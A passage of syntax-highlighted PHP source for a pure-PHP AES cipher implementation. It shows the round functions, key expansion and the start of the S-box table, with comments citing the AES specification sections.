class="hljs-variable">$state</span>, <span class="hljs-variable">$Nb</span> );</span><br><span class="language-php">                  <span class="hljs-variable">$state</span> = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">addRoundKey</span>( <span class="hljs-variable">$state</span>, <span class="hljs-variable">$w</span>, <span class="hljs-variable">$round</span>, <span class="hljs-variable">$Nb</span> );</span><br><span class="language-php">              &#125;</span><br><span class="language-php"></span><br><span class="language-php">              <span class="hljs-variable">$state</span> = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">subBytes</span>( <span class="hljs-variable">$state</span>, <span class="hljs-variable">$Nb</span> );</span><br><span class="language-php">              <span class="hljs-variable">$state</span> = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">shiftRows</span>( <span class="hljs-variable">$state</span>, <span class="hljs-variable">$Nb</span> );</span><br><span class="language-php">              <span class="hljs-variable">$state</span> = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">addRoundKey</span>( <span class="hljs-variable">$state</span>, <span class="hljs-variable">$w</span>, <span class="hljs-variable">$Nr</span>, <span class="hljs-variable">$Nb</span> );</span><br><span class="language-php"></span><br><span class="language-php">              <span class="hljs-variable">$output</span> = <span class="hljs-keyword">array</span>( <span class="hljs-number">4</span> * <span class="hljs-variable">$Nb</span> ); <span class="hljs-comment">// convert state to 1-d array before returning [�3.4]</span></span><br><span class="language-php">              <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">4</span> * <span class="hljs-variable">$Nb</span>;</span><br><span class="language-php">              <span class="hljs-variable">$i</span>++ ) &#123;</span><br><span class="language-php">                  <span class="hljs-variable">$output</span>[ <span class="hljs-variable">$i</span> ] = <span class="hljs-variable">$state</span>[ <span class="hljs-variable">$i</span> % <span class="hljs-number">4</span> ][ <span class="hljs-title function_ invoke__">floor</span>( <span class="hljs-variable">$i</span> / <span class="hljs-number">4</span> ) ];</span><br><span class="language-php">              &#125;</span><br><span class="language-php">              <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;</span><br><span class="language-php">          &#125;</span><br><span class="language-php">          <span class="hljs-comment">/**</span></span><br><span class="hljs-comment"><span class="language-php">          * Xor Round Key into state S [�5.1.4].</span></span><br><span class="hljs-comment"><span class="language-php">          *</span></span><br><span class="hljs-comment"><span class="language-php">          * <span class="hljs-doctag">@since</span> 2.8</span></span><br><span class="hljs-comment"><span class="language-php">          */</span></span><br><span class="language-php">          <span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addRoundKey</span>(<span class="hljs-params"> <span class="hljs-variable">$state</span>, <span class="hljs-variable">$w</span>, <span class="hljs-variable">$rnd</span>, <span class="hljs-variable">$Nb</span> </span>) </span>&#123;</span><br><span class="language-php">              <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$r</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$r</span> &lt; <span class="hljs-number">4</span>; <span class="hljs-variable">$r</span>++ ) &#123;</span><br><span class="language-php">                  <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$c</span> &lt; <span class="hljs-variable">$Nb</span>;</span><br><span class="language-php">                  <span class="hljs-variable">$c</span>++ ) &#123;</span><br><span class="language-php">                      <span class="hljs-variable">$state</span>[ <span class="hljs-variable">$r</span> ][ <span class="hljs-variable">$c</span> ] ^= <span class="hljs-variable">$w</span>[ <span class="hljs-variable">$rnd</span> * <span class="hljs-number">4</span> + <span class="hljs-variable">$c</span> ][ <span class="hljs-variable">$r</span> ];</span><br><span class="language-php">                  &#125;</span><br><span class="language-php">              &#125;</span><br><span class="language-php">              <span class="hljs-keyword">return</span> <span class="hljs-variable">$state</span>;</span><br><span class="language-php">          &#125;</span><br><span class="language-php"></span><br><span class="language-php">          <span class="hljs-comment">/**</span></span><br><span class="hljs-comment"><span class="language-php">          * Apply SBox to state S [�5.1.1].</span></span><br><span class="hljs-comment"><span class="language-php">          *</span></span><br><span class="hljs-comment"><span class="language-php">          * <span class="hljs-doctag">@since</span> 2.8</span></span><br><span class="hljs-comment"><span class="language-php">          */</span></span><br><span class="language-php">          <span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">subBytes</span>(<span class="hljs-params"> <span class="hljs-variable">$s</span>, <span class="hljs-variable">$Nb</span> </span>) </span>&#123;</span><br><span class="language-php">              <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$r</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$r</span> &lt; <span class="hljs-number">4</span>; <span class="hljs-variable">$r</span>++ ) &#123;</span><br><span class="language-php">                  <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$c</span> &lt; <span class="hljs-variable">$Nb</span>;</span><br><span class="language-php">                  <span class="hljs-variable">$c</span>++ ) &#123;</span><br><span class="language-php">                      <span class="hljs-variable">$s</span>[ <span class="hljs-variable">$r</span> ][ <span class="hljs-variable">$c</span> ] = <span class="hljs-built_in">self</span>::<span class="hljs-variable">$sBox</span>[ <span class="hljs-variable">$s</span>[ <span class="hljs-variable">$r</span> ][ <span class="hljs-variable">$c</span> ] ];</span><br><span class="language-php">                  &#125;</span><br><span class="language-php">              &#125;</span><br><span class="language-php">              <span class="hljs-keyword">return</span> <span class="hljs-variable">$s</span>;</span><br><span class="language-php">          &#125;</span><br><span class="language-php"></span><br><span class="language-php">          <span class="hljs-comment">/**</span></span><br><span class="hljs-comment"><span class="language-php">          * Shift row r of state S left by r bytes [�5.1.2].</span></span><br><span class="hljs-comment"><span class="language-php">          *</span></span><br><span class="hljs-comment"><span class="language-php">          * <span class="hljs-doctag">@since</span> 2.8</span></span><br><span class="hljs-comment"><span class="language-php">          */</span></span><br><span class="language-php">          <span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shiftRows</span>(<span class="hljs-params"> <span class="hljs-variable">$s</span>, <span class="hljs-variable">$Nb</span> </span>) </span>&#123;</span><br><span class="language-php">              <span class="hljs-variable">$t</span> = <span class="hljs-keyword">array</span>( <span class="hljs-number">4</span> );</span><br><span class="language-php">              <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$r</span> = <span class="hljs-number">1</span>; <span class="hljs-variable">$r</span> &lt; <span class="hljs-number">4</span>; <span class="hljs-variable">$r</span>++ ) &#123;</span><br><span class="language-php">                  <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$c</span> &lt; <span class="hljs-number">4</span>;</span><br><span class="language-php">                  <span class="hljs-variable">$c</span>++ ) &#123;</span><br><span class="language-php">                      <span class="hljs-variable">$t</span>[ <span class="hljs-variable">$c</span> ] = <span class="hljs-variable">$s</span>[ <span class="hljs-variable">$r</span> ][ ( <span class="hljs-variable">$c</span> + <span class="hljs-variable">$r</span> ) % <span class="hljs-variable">$Nb</span> ]; <span class="hljs-comment">// shift into temp copy</span></span><br><span class="language-php">                  &#125;</span><br><span class="language-php">                  <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$c</span> &lt; <span class="hljs-number">4</span>;</span><br><span class="language-php">                  <span class="hljs-variable">$c</span>++ ) &#123;</span><br><span class="language-php">                      <span class="hljs-variable">$s</span>[ <span class="hljs-variable">$r</span> ][ <span class="hljs-variable">$c</span> ] = <span class="hljs-variable">$t</span>[ <span class="hljs-variable">$c</span> ]; <span class="hljs-comment">// and copy back</span></span><br><span class="language-php">                  &#125;</span><br><span class="language-php">              &#125; <span class="hljs-comment">// note that this will work for Nb=4,5,6, but not 7,8 (always 4 for AES):</span></span><br><span class="language-php">              <span class="hljs-keyword">return</span> <span class="hljs-variable">$s</span>; <span class="hljs-comment">// see fp.gladman.plus.com/cryptography_technology/rijndael/aes.spec.311.pdf</span></span><br><span class="language-php">          &#125;</span><br><span class="language-php"></span><br><span class="language-php">          <span class="hljs-comment">/**</span></span><br><span class="hljs-comment"><span class="language-php">          * Combine bytes of each col of state S [�5.1.3].</span></span><br><span class="hljs-comment"><span class="language-php">          *</span></span><br><span class="hljs-comment"><span class="language-php">          * <span class="hljs-doctag">@since</span> 2.8</span></span><br><span class="hljs-comment"><span class="language-php">          */</span></span><br><span class="language-php">          <span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">mixColumns</span>(<span class="hljs-params"> <span class="hljs-variable">$s</span>, <span class="hljs-variable">$Nb</span> </span>) </span>&#123;</span><br><span class="language-php">              <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$c</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$c</span> &lt; <span class="hljs-number">4</span>; <span class="hljs-variable">$c</span>++ ) &#123;</span><br><span class="language-php">                  <span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>( <span class="hljs-number">4</span> ); <span class="hljs-comment">// &#x27;a&#x27; is a copy of the current column from &#x27;s&#x27;</span></span><br><span class="language-php">                  <span class="hljs-variable">$b</span> = <span class="hljs-keyword">array</span>( <span class="hljs-number">4</span> ); <span class="hljs-comment">// &#x27;b&#x27; is a�&#123;02&#125; in GF(2^8)</span></span><br><span class="language-php">                  <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">4</span>; <span class="hljs-variable">$i</span>++ ) &#123;</span><br><span class="language-php">                      <span class="hljs-variable">$a</span>[ <span class="hljs-variable">$i</span> ] = <span class="hljs-variable">$s</span>[ <span class="hljs-variable">$i</span> ][ <span class="hljs-variable">$c</span> ];</span><br><span class="language-php">                      <span class="hljs-variable">$b</span>[ <span class="hljs-variable">$i</span> ] = <span class="hljs-variable">$s</span>[ <span class="hljs-variable">$i</span> ][ <span class="hljs-variable">$c</span> ] &amp; <span class="hljs-number">0x80</span> ? <span class="hljs-variable">$s</span>[ <span class="hljs-variable">$i</span> ][ <span class="hljs-variable">$c</span> ] &lt;&lt; <span class="hljs-number">1</span> ^ <span class="hljs-number">0x011b</span> : <span class="hljs-variable">$s</span>[ <span class="hljs-variable">$i</span> ][ <span class="hljs-variable">$c</span> ] &lt;&lt; <span class="hljs-number">1</span>;</span><br><span class="language-php">                  &#125;</span><br><span class="language-php">                  <span class="hljs-comment">// a[n] ^ b[n] is a�&#123;03&#125; in GF(2^8)</span></span><br><span class="language-php">                  <span class="hljs-variable">$s</span>[<span class="hljs-number">0</span>][ <span class="hljs-variable">$c</span> ] = <span class="hljs-variable">$b</span>[<span class="hljs-number">0</span>] ^ <span class="hljs-variable">$a</span>[<span class="hljs-number">1</span>] ^ <span class="hljs-variable">$b</span>[<span class="hljs-number">1</span>] ^ <span class="hljs-variable">$a</span>[<span class="hljs-number">2</span>] ^ <span class="hljs-variable">$a</span>[<span class="hljs-number">3</span>]; <span class="hljs-comment">// 2*a0 + 3*a1 + a2 + a3</span></span><br><span class="language-php">                  <span class="hljs-variable">$s</span>[<span class="hljs-number">1</span>][ <span class="hljs-variable">$c</span> ] = <span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] ^ <span class="hljs-variable">$b</span>[<span class="hljs-number">1</span>] ^ <span class="hljs-variable">$a</span>[<span class="hljs-number">2</span>] ^ <span class="hljs-variable">$b</span>[<span class="hljs-number">2</span>] ^ <span class="hljs-variable">$a</span>[<span class="hljs-number">3</span>]; <span class="hljs-comment">// a0 * 2*a1 + 3*a2 + a3</span></span><br><span class="language-php">                  <span class="hljs-variable">$s</span>[<span class="hljs-number">2</span>][ <span class="hljs-variable">$c</span> ] = <span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] ^ <span class="hljs-variable">$a</span>[<span class="hljs-number">1</span>] ^ <span class="hljs-variable">$b</span>[<span class="hljs-number">2</span>] ^ <span class="hljs-variable">$a</span>[<span class="hljs-number">3</span>] ^ <span class="hljs-variable">$b</span>[<span class="hljs-number">3</span>]; <span class="hljs-comment">// a0 + a1 + 2*a2 + 3*a3</span></span><br><span class="language-php">                  <span class="hljs-variable">$s</span>[<span class="hljs-number">3</span>][ <span class="hljs-variable">$c</span> ] = <span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] ^ <span class="hljs-variable">$b</span>[<span class="hljs-number">0</span>] ^ <span class="hljs-variable">$a</span>[<span class="hljs-number">1</span>] ^ <span class="hljs-variable">$a</span>[<span class="hljs-number">2</span>] ^ <span class="hljs-variable">$b</span>[<span class="hljs-number">3</span>]; <span class="hljs-comment">// 3*a0 + a1 + a2 + 2*a3</span></span><br><span class="language-php">              &#125;</span><br><span class="language-php">              <span class="hljs-keyword">return</span> <span class="hljs-variable">$s</span>;</span><br><span class="language-php">          &#125;</span><br><span class="language-php"></span><br><span class="language-php">          <span class="hljs-comment">/**</span></span><br><span class="hljs-comment"><span class="language-php">          * Generate Key Schedule from Cipher Key [�5.2].</span></span><br><span class="hljs-comment"><span class="language-php">          *</span></span><br><span class="hljs-comment"><span class="language-php">          * Perform key expansion on cipher key to generate a key schedule.</span></span><br><span class="hljs-comment"><span class="language-php">          *</span></span><br><span class="hljs-comment"><span class="language-php">          * <span class="hljs-doctag">@param</span>  key cipher key byte-array (16 bytes).</span></span><br><span class="hljs-comment"><span class="language-php">          * <span class="hljs-doctag">@return</span> key schedule as 2D byte-array (Nr+1 x Nb bytes).</span></span><br><span class="hljs-comment"><span class="language-php">          * <span class="hljs-doctag">@since</span> 2.8</span></span><br><span class="hljs-comment"><span class="language-php">          */</span></span><br><span class="language-php">          <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">keyExpansion</span>(<span class="hljs-params"> <span class="hljs-variable">$key</span> </span>) </span>&#123;</span><br><span class="language-php">              <span class="hljs-variable">$Nb</span> = <span class="hljs-number">4</span>; <span class="hljs-comment">// block size (in words): no of columns in state (fixed at 4 for AES)</span></span><br><span class="language-php">              <span class="hljs-variable">$Nk</span> = <span class="hljs-title function_ invoke__">count</span>( <span class="hljs-variable">$key</span> ) / <span class="hljs-number">4</span>; <span class="hljs-comment">// key length (in words): 4/6/8 for 128/192/256-bit keys</span></span><br><span class="language-php">              <span class="hljs-variable">$Nr</span> = <span class="hljs-variable">$Nk</span> + <span class="hljs-number">6</span>; <span class="hljs-comment">// no of rounds: 10/12/14 for 128/192/256-bit keys</span></span><br><span class="language-php"></span><br><span class="language-php">              <span class="hljs-variable">$w</span>    = <span class="hljs-keyword">array</span>();</span><br><span class="language-php">              <span class="hljs-variable">$temp</span> = <span class="hljs-keyword">array</span>();</span><br><span class="language-php"></span><br><span class="language-php">              <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$Nk</span>; <span class="hljs-variable">$i</span>++ ) &#123;</span><br><span class="language-php">                  <span class="hljs-variable">$r</span>       = <span class="hljs-keyword">array</span>( <span class="hljs-variable">$key</span>[ <span class="hljs-number">4</span> * <span class="hljs-variable">$i</span> ], <span class="hljs-variable">$key</span>[ <span class="hljs-number">4</span> * <span class="hljs-variable">$i</span> + <span class="hljs-number">1</span> ], <span class="hljs-variable">$key</span>[ <span class="hljs-number">4</span> * <span class="hljs-variable">$i</span> + <span class="hljs-number">2</span> ], <span class="hljs-variable">$key</span>[ <span class="hljs-number">4</span> * <span class="hljs-variable">$i</span> + <span class="hljs-number">3</span> ] );</span><br><span class="language-php">                  <span class="hljs-variable">$w</span>[ <span class="hljs-variable">$i</span> ] = <span class="hljs-variable">$r</span>;</span><br><span class="language-php">              &#125;</span><br><span class="language-php"></span><br><span class="language-php">              <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-variable">$Nk</span>; <span class="hljs-variable">$i</span> &lt; ( <span class="hljs-variable">$Nb</span> * ( <span class="hljs-variable">$Nr</span> + <span class="hljs-number">1</span> ) ); <span class="hljs-variable">$i</span>++ ) &#123;</span><br><span class="language-php">                  <span class="hljs-variable">$w</span>[ <span class="hljs-variable">$i</span> ] = <span class="hljs-keyword">array</span>();</span><br><span class="language-php">                  <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$t</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$t</span> &lt; <span class="hljs-number">4</span>;</span><br><span class="language-php">                  <span class="hljs-variable">$t</span>++ ) &#123;</span><br><span class="language-php">                      <span class="hljs-variable">$temp</span>[ <span class="hljs-variable">$t</span> ] = <span class="hljs-variable">$w</span>[ <span class="hljs-variable">$i</span> - <span class="hljs-number">1</span> ][ <span class="hljs-variable">$t</span> ];</span><br><span class="language-php">                  &#125;</span><br><span class="language-php">                  <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$i</span> % <span class="hljs-variable">$Nk</span> == <span class="hljs-number">0</span> ) &#123;</span><br><span class="language-php">                      <span class="hljs-variable">$temp</span> = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">subWord</span>( <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">rotWord</span>( <span class="hljs-variable">$temp</span> ) );</span><br><span class="language-php">                      <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$t</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$t</span> &lt; <span class="hljs-number">4</span>;</span><br><span class="language-php">                      <span class="hljs-variable">$t</span>++ ) &#123;</span><br><span class="language-php">                          <span class="hljs-variable">$temp</span>[ <span class="hljs-variable">$t</span> ] ^= <span class="hljs-built_in">self</span>::<span class="hljs-variable">$rCon</span>[ <span class="hljs-variable">$i</span> / <span class="hljs-variable">$Nk</span> ][ <span class="hljs-variable">$t</span> ];</span><br><span class="language-php">                      &#125;</span><br><span class="language-php">                  &#125; <span class="hljs-keyword">elseif</span> ( <span class="hljs-variable">$Nk</span> &gt; <span class="hljs-number">6</span> &amp;&amp; <span class="hljs-variable">$i</span> % <span class="hljs-variable">$Nk</span> == <span class="hljs-number">4</span> ) &#123;</span><br><span class="language-php">                      <span class="hljs-variable">$temp</span> = <span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">subWord</span>( <span class="hljs-variable">$temp</span> );</span><br><span class="language-php">                  &#125;</span><br><span class="language-php">                  <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$t</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$t</span> &lt; <span class="hljs-number">4</span>;</span><br><span class="language-php">                  <span class="hljs-variable">$t</span>++ ) &#123;</span><br><span class="language-php">                      <span class="hljs-variable">$w</span>[ <span class="hljs-variable">$i</span> ][ <span class="hljs-variable">$t</span> ] = <span class="hljs-variable">$w</span>[ <span class="hljs-variable">$i</span> - <span class="hljs-variable">$Nk</span> ][ <span class="hljs-variable">$t</span> ] ^ <span class="hljs-variable">$temp</span>[ <span class="hljs-variable">$t</span> ];</span><br><span class="language-php">                  &#125;</span><br><span class="language-php">              &#125;</span><br><span class="language-php">              <span class="hljs-keyword">return</span> <span class="hljs-variable">$w</span>;</span><br><span class="language-php">          &#125;</span><br><span class="language-php"></span><br><span class="language-php">          <span class="hljs-comment">/**</span></span><br><span class="hljs-comment"><span class="language-php">          * Apply SBox to 4-byte word w.</span></span><br><span class="hljs-comment"><span class="language-php">          *</span></span><br><span class="hljs-comment"><span class="language-php">          * <span class="hljs-doctag">@since</span> 2.8</span></span><br><span class="hljs-comment"><span class="language-php">          */</span></span><br><span class="language-php">          <span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">subWord</span>(<span class="hljs-params"> <span class="hljs-variable">$w</span> </span>) </span>&#123;</span><br><span class="language-php">              <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">4</span>;</span><br><span class="language-php">              <span class="hljs-variable">$i</span>++ ) &#123;</span><br><span class="language-php">                  <span class="hljs-variable">$w</span>[ <span class="hljs-variable">$i</span> ] = <span class="hljs-built_in">self</span>::<span class="hljs-variable">$sBox</span>[ <span class="hljs-variable">$w</span>[ <span class="hljs-variable">$i</span> ] ];</span><br><span class="language-php">              &#125;</span><br><span class="language-php">              <span class="hljs-keyword">return</span> <span class="hljs-variable">$w</span>;</span><br><span class="language-php">          &#125;</span><br><span class="language-php"></span><br><span class="language-php">          <span class="hljs-comment">/**</span></span><br><span class="hljs-comment"><span class="language-php">          * Rotate 4-byte word w left by one byte.</span></span><br><span class="hljs-comment"><span class="language-php">          *</span></span><br><span class="hljs-comment"><span class="language-php">          * <span class="hljs-doctag">@since</span> 2.8</span></span><br><span class="hljs-comment"><span class="language-php">          */</span></span><br><span class="language-php">          <span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">rotWord</span>(<span class="hljs-params"> <span class="hljs-variable">$w</span> </span>) </span>&#123;</span><br><span class="language-php">              <span class="hljs-variable">$tmp</span> = <span class="hljs-variable">$w</span>[<span class="hljs-number">0</span>];</span><br><span class="language-php">              <span class="hljs-keyword">for</span> ( <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">3</span>;</span><br><span class="language-php">              <span class="hljs-variable">$i</span>++ ) &#123;</span><br><span class="language-php">                  <span class="hljs-variable">$w</span>[ <span class="hljs-variable">$i</span> ] = <span class="hljs-variable">$w</span>[ <span class="hljs-variable">$i</span> + <span class="hljs-number">1</span> ];</span><br><span class="language-php">              &#125;</span><br><span class="language-php">              <span class="hljs-variable">$w</span>[<span class="hljs-number">3</span>] = <span class="hljs-variable">$tmp</span>;</span><br><span class="language-php">              <span class="hljs-keyword">return</span> <span class="hljs-variable">$w</span>;</span><br><span class="language-php">          &#125;</span><br><span class="language-php"></span><br><span class="language-php">          <span class="hljs-comment">// sBox is pre-computed multiplicative inverse in GF(2^8) used in subBytes and keyExpansion [�5.1.1]</span></span><br><span class="language-php">          <span class="hljs-keyword">private</span> <span class="hljs-built_in">static</span> <span class="hljs-variable">$sBox</span> = <span class="hljs-keyword">array</span>(</span><br><span class="language-php">              <span class="hljs-number">0x63</span>,</span><br><span class="language-php">              <span class="hljs-number">0x7c</span>,</span><br><span class="language-php">              <span class="hljs-number">0x77</span>,</span><br><span class="language-php">              <span class="hljs-number">0x7b</span>,</span><br><span class="language-php">              <span class="hljs-number">0xf2</span>,</span><br><span class="language-php">              <span class="hljs-number">0x6b</span>,</span><br><span class="language-php">              <span class="hljs-number">0x6f</span>,</span><br><span class="language-php">              <span class="hljs-number">0xc5</span>,</span><br><span class="language-php">              <span class="hljs-number">0x30</span>,</span><br><span class="language-php">              <span class="hljs-number">0x01</span>,</span><br><span class="language-php">              <span class="hljs-number">0x67</span>,</span><br><span class="language-php">              <span class="hljs-number">0x2b</span>,</span><br><span class="language-php">              <span class="hljs-number">0xfe</span>,</span><br><span class="language-php">              <span class="hljs-number">0xd7</span>,</span><br><span class="language-php">              <span class="hljs-number">0xab</span>,</span><br><span class="language-php">              <span class="hljs-number">0x76</span>,</span><br><span class="language-php">              <span class="hljs-number">0xca</span>,</span><br><span class="language-php">              <span class="hljs-number">0x82</span>,</span><br><span class="language-php">              <span class="hljs-number">0xc9</span>,</span><br><span class="language-php">              <span class="hljs-number">0x7d</span>,</span><br><span class="language-php">              <span class="hljs-number">0xfa</span>,</span><br><span class="language-php">              <span class="hljs-number">0x59</span>,</span><br><span class="language-php">              <span class="hljs-number">0x47</span>,</span><br><span class="language-php">              <span class="hljs-number">0xf0</span>,</span><br><span class="language-php">              <span class="hljs-number">0xad</span>,</span><br><span class="language-php">              <span class="hljs-number">0xd4</span>,</span><br><span class="language-php">              <span class="hljs-number">0xa2</span>,</span><br><span class="language-php">              <span class="hljs-number">0xaf</span>,</span><br><span class="language-php">              <span class="hljs-number">0x9c</span>,</span><br><span class="language-php">              <span class="hljs-number">0xa4</span>,</span><br><span class="language-php">              <span class="hljs-number">0x72</span>,</span><br><span class="language-php">              <span class="hljs-number">0xc0</span>,</span><br><span class="language-php">              <span class="hljs-number">0xb7</span>,</span><br><span class="language-php">              <span class="hljs-number">0xfd</span>,</span><br><span class="language-php">              <span class="hljs-number">0x93</span>,</span><br><span class="language-php">              <span class="hljs-number">0x26</span>,</span><br><span class="language-php">              <span class="hljs-number">0x36</span>,</span><br><span class="language-php">              <span class="hljs-number">0x3f</span>,</span><br><span class="language-php">              <span class="hljs-number">0xf7</span>,</span><br><span class="language-php">              <span class="hljs-number">0xcc</span>,</span><br><span class="language-php">              <span class="hljs-number">0x34</span>,</span><br><span class="language-php">              <span class="hljs-number">0xa5</span>,</span><br><span class="language-php">              <span class="hljs-number">0xe5</span>,</span><br><span class="language-php">              <span class="hljs-number">0xf1</span>,</span><br><span class="language-php">              <span class="hljs-number">0x71</span>,</span><br><span class="language-php">              <span class="hljs-number">0xd8</span>,</span><br><span class="language-php">              <span class="hljs-number">0x31</span>,</span><br><span class="language-php">              <span class="hljs-number">0x15</span>,</span><br><span class="language-php">              <span class="hljs-number">0x04</span>,</span><br><span class="language-php">              <span class="hljs-number">0xc7</span>,</span><br><span class="language-php">              <span class="hljs-number">0x23</span>,</span><br><span class="language-php">              <span class="hljs-number">0xc3</span>,</span><br><span class="language-php">              <span class="hljs-number">0x18</span>,</span><br><span class="language-php">              <span class="hljs-number">0x96</span>,</span><br><span class="language-php">              <span class="hljs-number">0x05</span>,</span><br><span class="language-php">              <span class="hljs-number">0x9a</span>,</span><br><span class="language-php">              <span class="hljs-number">0x07</span>,</span><br><span class="language-php">              <span class="hljs-number">0x12</span>,</span><br><span class="language-php">              <span class="hljs-number">0x80</span>,</span><br><span class="language-php">              <span class="hljs-number">0xe2</span>,</span><br><span class="language-php">              <span class="hljs-number">0xeb</span>,</span><br><span class="language-php">              <span class="hljs-number">0x27</span>,</span><br><span class="language-php">              <span class="hljs-number">0xb2</span>,</span><br><span class="language-php">              <span class="hljs-number">0x75</span>,</span><br><span class="language-php">              <span class="hljs-number">0x09</span>,</span><br><span class="language-php">              <span class="hljs-number">0x83</span>,</span><br><span class="language-php">              <span class="hljs-number">0x2c</span>,</span><br><span class="language-php">              <span class="hljs-number">0x1a</span>,</span><br><span class="language-php">              <span class="hljs-number">0x1b</span>,</span><br><span class="language-php">              <span class="hljs-number">0x6e</span>,</span><br><span class="language-php">              <span class="hljs-number">0x5a</span>,</span><br><span class="language-php">              <span class="hljs-number">0xa0</span>,</span><br><span class="language-php">              <span class="hljs-number">0x52</span>,</span><br><span class="language-php">              <span class="hljs-number">0x3b</span>,</span><br><span class="language-php">              <span class="hljs-number">0xd6</span>,</span><br><span class="language-php">              <span class="hljs-number">0xb3</span>,</span><br><span class="language-php">              <span class="hljs-number">0x29</span>,</span><br><span class="language-php">              <span class="hljs-number">0xe3</span>,</span><br><span class="language-php">              <span class="hljs-number">0x2f</span>,</span><br><span class="language-php">              <span class="hljs-number">0x84</span>,</span><br><span class="language-php">              <span class="hljs-number">0x53</span>,</span><br><span class="language-php">              <span class="hljs-number">0xd1</span>,</span><br><span class="language-php">              <span class="hljs-number">0x00</span>,</span><br><span class="language-php">              <span class="hljs-number">0xed</span>,</span><br><span class="language-php">              <span class="hljs-number">0x20</span>,</span><br><span class="language-php">              <span class="hljs-number">0xfc</span>,</span><br><span class="language-php">              <span class="hljs-number">0xb1</span>,</span><br><span class="language-php">              <span class="hljs-number">0x5b</span>,</span><br><span class="language-php">              <span class="hljs-number">0x6a</span>,</span><br><span class="language-php">              <span class="hljs-number">0xcb</span>,</span><br><span class="language-php">              <span class="hljs-number">0xbe</span>,</span><br><span class="language-php">              <span class="hljs-number">0x39</span>,</span><br><span class="language-php">              <span class="hljs-number">0x4a</span>,</span><br><span class="language-php">              <span class="hljs-number">0x4c</span>,</span><br><span class="language-php">              <span class="hljs-number">0x58</span>,</span><br><span class="language-php">              <span class="hljs-number">0xcf</span>,</span><br><span class="language-php">              <span class="hljs-number">0xd0</span>,</span><br><span class="language-php">              <span class="hljs-number">0xef</span>,</span><br><span class="language-php">              <span class="hljs-number">0xaa</span>,</span><br><span class="language-php">              <span class="hljs-number">0xfb</span>,</span><br><span class="language-php">              <span class="hljs-number">0x43</span>,</span><br><span class="language-php">              <span class="hljs-number">0x4d</span>,</span><br><span class="language-php">              <span class="hljs-number">0x33</span>,</span><br><span class="language-php">              <span class="hljs-number">0x85</span>,</span><br><span class="language-php">              <span class="hljs-number">0x45</span>,</span><br><span class="language-php">              <span class="hljs-number">0xf9</span>,</span><br><span class="language-php">              <span class="hljs-number">0x02</span>,</span><br><span class="language-php">              <span class="hljs-number">0x7f</span>,</span><br><span class="language-php">              <span class="hljs-number">0x50</span>,</span><br><span class="language-php">              <span class="hljs-number">0x3c</span>,</span><br><span class="language-php">              <span class="hljs-number">0x9f</span>,</span><br><span class="language-php">              <span class="hljs-number">0xa8</span>,</span><br><span class="language-php">              <span class="hljs-number">0x51</span>,</span><br><span class="language-php">              <span class="hljs-number">0xa3</span>,</span><br><span class="language-php">              <span class="hljs-number">0x40</span>,</span><br><span class="language-php">              <span class="hljs-number">0x8f</span>,</span><br><span class="language-php">              <span class="hljs-number">0x92</span>,</span><br><span class="language-php">              <span class="hljs-number">0x9d</span>,</span><br><span class="language-php">              <span 